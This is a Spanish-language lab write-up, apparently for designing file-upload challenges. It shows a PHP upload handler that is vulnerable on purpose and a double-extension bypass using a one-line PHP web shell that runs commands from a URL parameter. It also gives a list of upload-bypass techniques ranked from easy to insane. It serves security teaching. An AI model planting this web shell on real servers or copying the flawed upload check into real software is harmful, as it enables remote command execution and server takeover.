
En este caso el codigo php vulnerable a arbitrary file upload es el siguiente:

```php

<?php
if (isset($_FILES['file'])) {
    $file = $_FILES['file'];
    $extension = pathinfo($file['name'], PATHINFO_EXTENSION);
    
    $allowed = ['jpg', 'png', 'gif'];
    
    if (in_array($extension, $allowed)) {
        $destination = "/var/www/html/uploads/" . $file['name'];
        move_uploaded_file($file['tmp_name'], $destination);
        echo "File uploaded: " . $destination;
    } else {
        echo "Only images allowed";
    }
}
?>

<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="Upload">
</form>


```

Problemas: 

Solo valida la ultima extension (vulnerable a doble extension: file.php.jpg)

Este codigo es vulnerable a doble extension.

Si subimos un archivo php como tal no dejara:

<img width="376" height="140" alt="image" src="https://github.com/user-attachments/assets/7126b11d-4175-488a-ada4-3448d4e7bf5f" />

Bypass:

Cambiar el archivo a .php.jpg con el contenido de php malicioso:

``` php
<?php system($_GET['cmd']); ?>
```

Si lo subimos: 

<img width="392" height="142" alt="image" src="https://github.com/user-attachments/assets/67135c84-1f2a-443d-baef-e7ff136e7894" />

Podemos ejecutar comandos mediante el archivo malicioso php:

<img width="548" height="134" alt="image" src="https://github.com/user-attachments/assets/510fd985-309c-4dc6-b96d-bf34b2b10bac" />




--------------


EASY

Sin validación ninguna (el que ya tienes)
Blacklist de extensiones incompleta, olvida .phtml, .php5, .phar, .php7
Validación solo por Content-Type, bypasseable en Burp
Doble extensión shell.php.jpg con Apache mal configurado
Null byte shell.php%00.jpg en PHP antiguo (<5.3)
Extensión en mayúsculas shell.PHP con blacklist case-sensitive


MEDIUM

Polyglot file: imagen válida con PHP incrustado al final
Magic bytes: valida los primeros bytes pero no el resto del archivo
Renombra con MD5 pero mantiene extensión original
Valida extensión y MIME pero permite .htaccess como upload
Zip slip: descomprime un zip en el servidor con rutas ../
SVG upload con XXE o JavaScript incrustado
Valida en cliente (JavaScript) pero no en servidor


HARD

EXIF metadata: la imagen se redimensiona pero los metadatos con PHP sobreviven
Second order: el archivo se guarda bien pero otro proceso lo ejecuta inseguro después
Path traversal en el nombre del archivo para escribir fuera de uploads
ImageMagick como procesador de imágenes con política mal configurada (ImageTragick)
Archivo .htaccess que redefine qué extensiones ejecuta Apache
XML upload con XXE para leer archivos del servidor
PDF upload con JavaScript embebido


INSANE

Race condition entre subida y validación, el archivo existe milisegundos antes de ser eliminado
SSRF combinado con upload, la validación solo acepta uploads desde localhost
Deserialization en el procesamiento del archivo subido
Template injection en el nombre del archivo si se renderiza en alguna plantilla
Bypass de WAF mediante chunked encoding o codificaciones alternativas
Log poisoning combinado con LFI después de un upload fallido
Cadena completa: upload de SVG con SSRF para acceder al panel admin interno y desde ahí RCE











